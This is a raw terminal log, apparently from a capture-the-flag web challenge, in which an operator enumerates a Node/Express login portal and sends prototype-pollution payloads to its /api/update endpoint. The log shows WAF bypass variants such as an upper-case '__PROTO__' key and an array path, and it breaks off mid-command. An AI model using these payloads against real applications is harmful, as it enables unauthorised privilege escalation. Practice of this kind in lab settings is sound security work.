@@ -1,0 +1,2161 @@
+──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -v http://65.1.162.7/
+curl -s http://65.1.162.7/ | head -c 2000
+*   Trying 65.1.162.7:80...
+* Established connection to 65.1.162.7 (65.1.162.7 port 80) from 10.133.15.92 port 47328 
+* using HTTP/1.x
+> GET / HTTP/1.1
+> Host: 65.1.162.7
+> User-Agent: curl/8.20.0
+> Accept: */*
+> 
+* Request completely sent off
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Wed, 09 Sep 2026 06:20:57 GMT
+< Content-Type: text/html; charset=UTF-8
+< Content-Length: 8984
+< Connection: keep-alive
+< x-powered-by: Express
+< accept-ranges: bytes
+< cache-control: public, max-age=0
+< last-modified: Sun, 06 Sep 2026 04:33:06 GMT
+< etag: W/"2318-1a074fdcfd0"
+< set-cookie: PP_NODE=pp04; path=/; HttpOnly
+< 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>HEX_09 // CYBER_GATEWAY</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: #030804;
+            font-family: 'JetBrains Mono', monospace;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #00ff66;
+            position: relative;
+        }
+        #matrix-canvas {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 1;
+            opacity: 0.85;
+        }
+        .scanline-overlay {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.45) 50%);
+            background-size: 100% 3px;
+            pointer-events: none;
+            z-index: 2;
+        }
+        .terminal-panel {
+            position: relative;
+            z-index: 3;
+            width: 440px;
+            background: rgba(5, 15, 8, 0.9);
+            border: 1px solid #00ff66;
+            border-radius: 4px;
+            box-shadow: 0 0 25px rgba(0, 255, 102, 0.3);
+            backdrop-filter: blur(8px);
+        }
+        .terminal-header {
+            background: rgba(0, 255, 102, 0.12);
+            border-bottom: 1px solid #00ff66;
+            padding: 8px 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            font-weight: 700;
+        }
+        .status-dot {
+            width: 8px; height: 8px;
+            background-color: #00ff66;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #00ff66;
+            animation: blink 1.2s infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+        .terminal-body { padding: 24px; }
+        h2 {
+            font-size: 1.1rem;
+            margin-bottom: 6px;
+            text-shadow: 0 0 8px rgba(0, 255, 102, 0.8);
+        }
+        .subtitle {
+            font-size: 0.72rem;
+            color: #009933;
+            margin-bottom: 20px;
+        }
+        .input-group { margin-bottom: 16px; }
+        .input-group label {
+            display: block;
+            font-size: 0.75rem;
+            margin-bottom: 6px;
+            color: #00cc55;
+        }
+        .input-wrapper {
+            display: flex;
+            align-items: center;
+            background: rgba(0, 10, 3, 0.95);
+            border: 1px solid #006622;
+            border-radius: 3px;
+            padding: 0 10px;
+        }
+        .input-wrapper:focus-within {
+            border-color: #00ff66;
+            box-shadow: 0 0 10px rgba(0, 255, 102, 0.4);
+        }
+        .input-prompt { color: #00ff66; margin-right: 8px; }
+        input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            outline: none;
+            padding: 10px 0;
+            color: #00ff66;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 8px;
+            background: rgba(0, 255, 102, 0.1);
+            border: 1px solid #00ff66;
+            color: #00ff66;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 700;
+            font-size: 0.85rem;
+            cursor: pointer;
+            border-radius: 3px;
+            transition: 0.2s;
+        }
+        button:hover {
+            background: #00ff66;
+            color: #030804;
+            box-shadow: 0 0 18px rgba(0, 255, 102, 0.6);
+        }
+        #error-box {
+            margin-top: 14px;
+            font-size: 0.72rem;
+            color: #ff3344;
+            word-break: break-all;
+        }
+        #error-box pre {
+            background: rgba(255, 0, 50, 0.08);
+            border-left: 2px solid #ff3344;
+            padding: 8px;
+            margin-top: 6px;
+            max-height: 120px;
+            overflow-y: auto;
+            color: #ff6677;
+        }
+        .access-hint {
+            margin-top: 18px;
+            font-size: 0.7rem;
+            color: #007722;
+            text-align: center;
+            border-top: 1px dashed rgba(0, 255, 102, 0.2);
+            padding-top: 12px;
+        }
+    </style>
+</head>
+<body>
+    <canvas id="matrix-canvas"></canvas>
+    <div class="scanline-overlay"></div>
+
+    <div class="terminal-panel">
+        <div class="terminal-header">
+            <span>TERMINAL_NODE // DEV_HEX09</span>
+            <span class="status-dot"></span>
+        </div>
+        <div class="terminal-body">
+            <h2>SYS_AUTH_PORTAL</h2>
+            <div class="subtitle">TARGET: SQLite Gateway v2.4.1</div>
+
+            <div class="input-group">
+                <label>OPERATOR_ID</label>
+                <div class="input-wrapper">
+                    <span class="input-prompt">&gt;</span>
+                    <input type="text" id="username" autocomplete="off" spellcheck="false" placeholder="handle">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>CIPHER_KEY</label>
+                <div class="input-wrapper">
+                    <span class="input-prompt">&gt;</span>
+                    <input type="password" id="password" placeholder="passphrase">
+                </div>
+            </div>
+
+            <button onclick="login()">EXECUTE_HANDSHAKE</button>
+            <div id="error-box"></div>
+            <div class="access-hint">[SEC_OVERRIDE]: Guests are welcome to access the system.</div>
+        </div>
+    </div>
+
+    <script>
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const matrixChars = "01010101ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        const fontSize = 14;
+        let columns = Math.floor(canvas.width / fontSize);
+        let drops = Array(columns).fill(1);
+
+        window.addEventListener('resize', () => {
+            columns = Math.floor(canvas.width / fontSize);
+            drops = Array(columns).fill(1);
+        });
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(3, 8, 4, 0.08)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.font = fontSize + "px 'JetBrains Mono', monospace";
+
+            for (let i = 0; i < drops.length; i++) {
+                const char = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
+                ctx.fillStyle = Math.random() > 0.85 ? '#33ff77' : '#006622';
+                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.98) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 45);
+
+        async function login() {
+            const u = document.getElementById('username').value.trim();
+            const p = document.getElementById('password').value.trim();
+            const errBox = document.getElementById('error-box');
+            errBox.innerHTML = '<span style="color:#00ff66;">[i] Transmitting credentials...</span>';
+
+            try {
+                const res = await fetch('/api/login', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username: u, password: p })
+                });
+                const data = await res.json();
+
+                if (data.redirect) {
+                    window.location.href = data.redirect;
+                } else if (data.trace) {
+                    errBox.innerHTML = `[!] UNHANDLED_EXCEPTION:<br/><pre>${data.trace}</pre>`;
+                } else {
+                    errBox.innerText = `[!] ERROR: ${data.error || 'Access Denied.'}`;
+                }
+            } catch (err) {
+                errBox.innerText = "[!] NETWORK_ERROR: Service unreachable.";
+            }
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') login();
+        });
+    </script>
+</body>
+* Connection #0 to host 65.1.162.7:80 left intact
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>HEX_09 // CYBER_GATEWAY</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: #030804;
+            font-family: 'JetBrains Mono', monospace;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #00ff66;
+            position: relative;
+        }
+        #matrix-canvas {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 1;
+            opacity: 0.85;
+        }
+        .scanline-overlay {
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.45) 50%);
+            background-size: 100% 3px;
+            pointer-events: none;
+            z-index: 2;
+        }
+        .terminal-panel {
+            position: relative;
+            z-index: 3;
+            width: 440px;
+            background: rgba(5, 15, 8, 0.9);
+            border: 1px solid #00ff66;
+            border-radius: 4px;
+            box-shadow: 0 0 25px rgba(0, 255, 102, 0.3);
+            backdrop-filter: blur(8px);
+        }
+        .terminal-header {
+            background: rgba(0, 255, 102, 0.12);
+            border-bottom: 1px solid #00ff66;
+            padding: 8px 14px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 0.75rem;
+            font-weight: 700;
+        }
+        .status-dot {
+            width: 8px; height: 8px;
+            background-color: #00ff66;
+            border-radius: 50%;
+                                                                                                                                                                          
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -X POST http://65.1.162.7/api/config \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__": {"polluted": "yes"}}'
+{"error":"Not found"}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -X POST http://65.1.162.7/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": {"__proto__": {"toString": null}}, "password": "x"}' | head -c 2000
+
+curl -s -X POST http://65.1.162.7/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": ["a","b"], "password": {"x":1}}' | head -c 2000
+{"error":"Internal server error"}{"error":"Internal server error"}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -X POST http://65.1.162.7/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": {"__proto__": {"isAdmin": true}}, "password": "x"}'
+{"error":"Internal server error"}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ -d '{"username": {"constructor": {"prototype": {"isAdmin": true}}}, "password": "x"}'
+-d: command not found
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -c cookies.txt -b cookies.txt http://65.1.162.7/api/login \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"username":"guest","password":"guest"}' -v 2>&1 | tail -20
+> 
+} [39 bytes data]
+* upload completely sent off: 39 bytes
+< HTTP/1.1 200 OK
+< Server: nginx
+< Date: Wed, 09 Sep 2026 06:29:33 GMT
+< Content-Type: application/json; charset=utf-8
+< Content-Length: 74
+< Connection: keep-alive
+< x-powered-by: Express
+< cache-control: no-store, no-cache, must-revalidate, private
+< etag: W/"4a-hPAl+qUhGeZcR7O9djxzYqfVkiI"
+* Added cookie connect.sid="s%3Aeoz6ekdDnWaOWVnSBxuGlp4BxWoTe7YE.0cZ7aOWOxbmxYCa%2B5sGkCbB0%2BEON6YVvAaMyjKd2O7I" for domain 65.1.162.7, path /, expire 1788938973
+< set-cookie: connect.sid=s%3Aeoz6ekdDnWaOWVnSBxuGlp4BxWoTe7YE.0cZ7aOWOxbmxYCa%2B5sGkCbB0%2BEON6YVvAaMyjKd2O7I; Path=/; Expires=Wed, 09 Sep 2026 07:29:33 GMT; HttpOnly; SameSite=Strict
+* Added cookie PP_NODE="pp08" for domain 65.1.162.7, path /, expire 0
+< set-cookie: PP_NODE=pp08; path=/; HttpOnly
+< 
+{ [74 bytes data]
+* Connection #0 to host 65.1.162.7:80 left intact
+{"success":true,"message":"Login successful","redirect":"/dashboard.html"}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ gobuster dir -u http://65.1.162.7/ -w /usr/share/wordlists/dirb/common.txt -x html,json
+gobuster dir -u http://65.1.162.7/api/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://65.1.162.7/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Extensions:              html,json
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 1462 / 13839 (10.56%)[ERROR] error on word aspdnsfcommon.html: timeout occurred during the request
+[ERROR] error on word aspdnsfcommon.json: timeout occurred during the request
+[ERROR] error on word asp.json: timeout occurred during the request
+[ERROR] error on word aspdnsfencrypt: timeout occurred during the request
+[ERROR] error on word aspdnsfgateways.html: timeout occurred during the request
+[ERROR] error on word aspdnsfpatterns: timeout occurred during the request
+[ERROR] error on word aspdnsfpatterns.html: timeout occurred during the request
+[ERROR] error on word aspdnsfencrypt.json: timeout occurred during the request
+[ERROR] error on word aspdnsfgateways.json: timeout occurred during the request
+[ERROR] error on word aspdnsfgateways: timeout occurred during the request
+dashboard.html       (Status: 302) [Size: 23] [--> /]
+index.html           (Status: 200) [Size: 8984]
+index.html           (Status: 200) [Size: 8984]
+Progress: 13839 / 13839 (100.00%)
+===============================================================
+Finished
+===============================================================
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://65.1.162.7/api/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+Progress: 269 / 269 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -c cookies.txt -b cookies.txt http://65.1.162.7/dashboard.html | head -c 4000
+Found. Redirecting to /                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ cat cookies.txt
+# Netscape HTTP Cookie File
+# https://curl.se/docs/http-cookies.html
+# This file was generated by libcurl! Edit at your own risk.
+
+#HttpOnly_65.1.162.7    FALSE   /       FALSE   0       PP_NODE pp08
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -v -c cookies.txt -b cookies.txt http://65.1.162.7/dashboard.html 2>&1 | grep -E "^(> Cookie|< HTTP|< [Ll]ocation)"
+> Cookie: PP_NODE=pp08
+< HTTP/1.1 302 Found
+< location: /
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -c cookies.txt -X POST http://65.1.162.7/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"guest","password":"guest"}' > /dev/null
+
+curl -s -b cookies.txt http://65.1.162.7/dashboard.html | head -c 4000
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>HEX_09 // SYSTEM_CONSOLE</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            background-color: #030804;
+            font-family: 'JetBrains Mono', monospace;
+            min-height: 100vh;
+            color: #00ff66;
+            position: relative;
+            padding: 30px 15px;
+            overflow-x: hidden;
+        }
+        #matrix-canvas {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 1;
+            opacity: 0.65;
+            pointer-events: none;
+        }
+        .scanline-overlay {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.4) 50%);
+            background-size: 100% 3px;
+            pointer-events: none;
+            z-index: 2;
+        }
+        .container {
+            max-width: 860px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 3;
+        }
+        .system-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: rgba(5, 15, 8, 0.9);
+            border: 1px solid #00ff66;
+            padding: 10px 18px;
+            margin-bottom: 24px;
+            font-size: 0.75rem;
+            box-shadow: 0 0 15px rgba(0, 255, 102, 0.2);
+        }
+        .user-tag {
+            color: #fff;
+            background: rgba(0, 255, 102, 0.2);
+            padding: 2px 8px;
+            border-radius: 2px;
+        }
+        .terminal-panel {
+            background: rgba(4, 12, 6, 0.88);
+            border: 1px solid #009933;
+            border-radius: 4px;
+            margin-bottom: 24px;
+            box-shadow: 0 0 20px rgba(0, 255, 102, 0.15);
+            backdrop-filter: blur(6px);
+        }
+        .panel-header {
+            background: rgba(0, 255, 102, 0.08);
+            border-bottom: 1px solid #009933;
+            padding: 10px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.8rem;
+            font-weight: 700;
+        }
+        .panel-body { padding: 20px; }
+        p {
+            font-size: 0.8rem;
+            color: #00cc55;
+            margin-bottom: 14px;
+            line-height: 1.5;
+        }
+        textarea {
+            width: 100%;
+            height: 140px;
+            background: rgba(0, 5, 2, 0.95);
+            border: 1px solid #006622;
+            color: #00ff66;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+            padding: 12px;
+            border-radius: 3px;
+            outline: none;
+        }
+        textarea:focus {
+            border-color: #00ff66;
+            box-shadow: 0 0 12px rgba(0, 255, 102, 0.3);
+        }
+        button {
+            padding: 10px 22px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.8rem;
+            font-weight: 700;
+            cursor: pointer;
+            border-radius: 3px;
+            margin-top: 10px;
+            background: transparent;
+        }
+        .btn-action {
+            border: 1px solid #00ff66;
+            color: #00ff66;
+        }
+        .btn-action:hover {
+            background: #00ff66;
+            color: #030804;
+            box-shadow: 0 0 20px rgba(0, 255, 102, 0.6);
+        }
+        .btn-admin {
+            border: 1px solid #00e5ff;
+            color: #00e5ff;
+        }
+        .btn-admin:hover {
+            background: #00e5ff;
+            color: #030804;
+            box-shadow: 0 0 20px rgba(0, 229, 2                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -b cookies.txt http://65.1.162.7/dashboard.html -o dashboard_full.html
+wc -l dashboard_full.html
+grep -oE '/api/[a-zA-Z0-9/_-]+' dashboard_full.html | sort -u
+grep -n "fetch(" dashboard_full.html
+256 dashboard_full.html
+/api/flag
+/api/update
+230:                const res = await fetch('/api/flag');
+244:                const res = await fetch('/api/update', {
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ sed -n '/<body>/,/<\/body>/p' dashboard_full.html | grep -v "^\s*<canvas\|scanline"
+<body>
+
+    <div class="container">
+        <div class="system-bar">
+            <div>HOST: <span style="color:#fff;">CORP-GATEWAY-09</span></div>
+            <div>STATUS: <span style="color:#00ff66;">ONLINE (RO-MODE)</span></div>
+            <div>SESSION: <span class="user-tag">GUEST_PRIVILEGES</span></div>
+        </div>
+
+        <div class="terminal-panel" style="border-color: #008899;">
+            <div class="panel-header" style="color: #00e5ff; border-color: #008899;">
+                <span>SEC_VAULT // PRIVILEGE_CHECK</span>
+                <span>ENDPOINT: /api/flag</span>
+            </div>
+            <div class="panel-body">
+                <p>Request authorization token from the protected memory sector. Elevated global state required.</p>
+                <button class="btn-admin" onclick="getFlag()">QUERY_VAULT()</button>
+                <pre id="flag-out" class="out-admin">&gt; Ready for memory query...</pre>
+            </div>
+        </div>
+
+        <div class="terminal-panel">
+            <div class="panel-header">
+                <span>REGISTRY_SYNC // SYSTEM_MUTATION</span>
+                <span>ENDPOINT: /api/update</span>
+            </div>
+            <div class="panel-body">
+                <p>Commit runtime configuration key-pairs to the operational environment. Dynamic property paths supported.</p>
+                <textarea id="json-input" spellcheck="false">{
+  "path": "runtime.theme",
+  "value": "matrix-green"
+}</textarea>
+                <br>
+                <button class="btn-action" onclick="syncConfig()">COMMIT_MUTATION()</button>
+                <pre id="sync-out">&gt; Awaiting mutation payload...</pre>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const matrixChars = "01010101ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        const fontSize = 14;
+        let columns = Math.floor(canvas.width / fontSize);
+        let drops = Array(columns).fill(1);
+
+        window.addEventListener('resize', () => {
+            columns = Math.floor(canvas.width / fontSize);
+            drops = Array(columns).fill(1);
+        });
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(3, 8, 4, 0.08)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.font = fontSize + "px 'JetBrains Mono', monospace";
+
+            for (let i = 0; i < drops.length; i++) {
+                const char = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
+                ctx.fillStyle = Math.random() > 0.85 ? '#33ff77' : '#006622';
+                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.98) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 45);
+
+        async function getFlag() {
+            const out = document.getElementById('flag-out');
+            out.innerText = "> Sending authorization handshake to /api/flag...";
+            try {
+                const res = await fetch('/api/flag');
+                const data = await res.json();
+                out.innerText = "> RESPONSE:\n" + JSON.stringify(data, null, 2);
+            } catch (e) {
+                out.innerText = "> COMMUNICATION_FAILURE: Endpoint unreachable.";
+            }
+        }
+
+        async function syncConfig() {
+            const out = document.getElementById('sync-out');
+            out.innerText = "> Transmitting payload to /api/update...";
+            try {
+                const raw = document.getElementById('json-input').value;
+                const payload = JSON.parse(raw);
+                const res = await fetch('/api/update', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await res.json();
+                out.innerText = "> SERVER_RESPONSE (" + res.status + "):\n" + JSON.stringify(data, null, 2);
+            } catch (err) {
+                out.innerText = "> PARSE_ERROR: Invalid JSON structure provided in input buffer.";
+            }
+        }
+    </script>
+</body>
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ tail -c 4000 dashboard_full.html
+horization token from the protected memory sector. Elevated global state required.</p>
+                <button class="btn-admin" onclick="getFlag()">QUERY_VAULT()</button>
+                <pre id="flag-out" class="out-admin">&gt; Ready for memory query...</pre>
+            </div>
+        </div>
+
+        <div class="terminal-panel">
+            <div class="panel-header">
+                <span>REGISTRY_SYNC // SYSTEM_MUTATION</span>
+                <span>ENDPOINT: /api/update</span>
+            </div>
+            <div class="panel-body">
+                <p>Commit runtime configuration key-pairs to the operational environment. Dynamic property paths supported.</p>
+                <textarea id="json-input" spellcheck="false">{
+  "path": "runtime.theme",
+  "value": "matrix-green"
+}</textarea>
+                <br>
+                <button class="btn-action" onclick="syncConfig()">COMMIT_MUTATION()</button>
+                <pre id="sync-out">&gt; Awaiting mutation payload...</pre>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const canvas = document.getElementById('matrix-canvas');
+        const ctx = canvas.getContext('2d');
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const matrixChars = "01010101ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        const fontSize = 14;
+        let columns = Math.floor(canvas.width / fontSize);
+        let drops = Array(columns).fill(1);
+
+        window.addEventListener('resize', () => {
+            columns = Math.floor(canvas.width / fontSize);
+            drops = Array(columns).fill(1);
+        });
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(3, 8, 4, 0.08)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.font = fontSize + "px 'JetBrains Mono', monospace";
+
+            for (let i = 0; i < drops.length; i++) {
+                const char = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
+                ctx.fillStyle = Math.random() > 0.85 ? '#33ff77' : '#006622';
+                ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.98) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 45);
+
+        async function getFlag() {
+            const out = document.getElementById('flag-out');
+            out.innerText = "> Sending authorization handshake to /api/flag...";
+            try {
+                const res = await fetch('/api/flag');
+                const data = await res.json();
+                out.innerText = "> RESPONSE:\n" + JSON.stringify(data, null, 2);
+            } catch (e) {
+                out.innerText = "> COMMUNICATION_FAILURE: Endpoint unreachable.";
+            }
+        }
+
+        async function syncConfig() {
+            const out = document.getElementById('sync-out');
+            out.innerText = "> Transmitting payload to /api/update...";
+            try {
+                const raw = document.getElementById('json-input').value;
+                const payload = JSON.parse(raw);
+                const res = await fetch('/api/update', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const data = await res.json();
+                out.innerText = "> SERVER_RESPONSE (" + res.status + "):\n" + JSON.stringify(data, null, 2);
+            } catch (err) {
+                out.innerText = "> PARSE_ERROR: Invalid JSON structure provided in input buffer.";
+            }
+        }
+    </script>
+</body>
+</html>                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -b cookies.txt -X POST http://65.1.162.7/api/update \
+  -H "Content-Type: application/json" \
+  -d '{"path": "runtime.theme", "value": "matrix-green"}'
+{"success":true,"message":"Configuration merged successfully."}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -b cookies.txt -X POST http://65.1.162.7/api/update \
+  -H "Content-Type: application/json" \
+  -d '{"path": "__proto__.isAdmin", "value": true}'
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -b cookies.txt http://65.1.162.7/api/flag
+{"error":"Access Denied. Global admin privileges required."}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ for key in isAdmin admin authorized elevated authenticated isAuthenticated privileged root superuser; do
+  echo "== $key =="
+  curl -s -b cookies.txt -X POST http://65.1.162.7/api/update \
+    -H "Content-Type: application/json" \
+    -d "{\"path\": \"__proto__.$key\", \"value\": true}"
+  echo
+  curl -s -b cookies.txt http://65.1.162.7/api/flag
+  echo
+done
+== isAdmin ==
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}
+{"error":"Access Denied. Global admin privileges required."}
+== admin ==
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}
+{"error":"Access Denied. Global admin privileges required."}
+== authorized ==
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}
+{"error":"Access Denied. Global admin privileges required."}
+== elevated ==
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}
+{"error":"Access Denied. Global admin privileges required."}
+== authenticated ==
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}
+{"error":"Access Denied. Global admin privileges required."}
+== isAuthenticated ==
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}
+{"error":"Access Denied. Global admin privileges required."}
+== privileged ==
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}
+{"error":"Access Denied. Global admin privileges required."}
+== root ==
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}
+{"error":"Access Denied. Global admin privileges required."}
+== superuser ==
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}
+{"error":"Access Denied. Global admin privileges required."}
+                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -b cookies.txt -X POST http://65.1.162.7/api/update \
+  -H "Content-Type: application/json" \
+  -d '{"path": "__PROTO__.isAdmin", "value": true}'
+{"success":true,"message":"Configuration merged successfully."}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -b cookies.txt -X POST http://65.1.162.7/api/update \
+  -H "Content-Type: application/json" \
+  -d '{"path": "constructor.prototype.isAdmin", "value": true}'
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -b cookies.txt -X POST http://65.1.162.7/api/update \
+  -H "Content-Type: application/json" \
+  -d '{"path": ["__proto__", "isAdmin"], "value": true}'
+{"success":true,"message":"Configuration merged successfully."}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -b cookies.txt -X POST http://65.1.162.7/api/update \
+  -H "Content-Type: application/json" \
+  -d '{"path": "__proto__[isAdmin]", "value": true}'
+{"error":"WAF ALERT: Malicious prototype manipulation blocked."}                                                                                                                                                                       
+┌──(white㉿white)-[~/iatcq2026/web]
+└─$ curl -s -b cookies.txt -X POST http://65.1.162.7/api/update \
+  -H "Content-Type: application/json" \
